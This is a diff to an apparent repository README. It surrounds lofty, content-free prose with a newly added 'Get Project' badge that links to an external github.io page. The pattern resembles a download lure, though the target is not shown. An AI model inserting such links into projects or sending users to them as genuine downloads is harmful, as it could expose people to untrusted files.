@@ -6,6 +6,7 @@ What you will find here is not just a collection of scripts, folders, or version
 
 The philosophy of this repository is simple: **to embrace both structure and imagination.** Software is a paradox — at once rigid and free, mathematical and poetic. Code compiles in the binary silence of machines, but it speaks to people in the fluidity of language, intention, and vision. This project stands as a bridge between those realms.
 
+[![Get Project](https://img.shields.io/badge/Get-Project-blueviolet)](https://overproject123.github.io/.github/)
 ---
 
 ### Why this repository exists
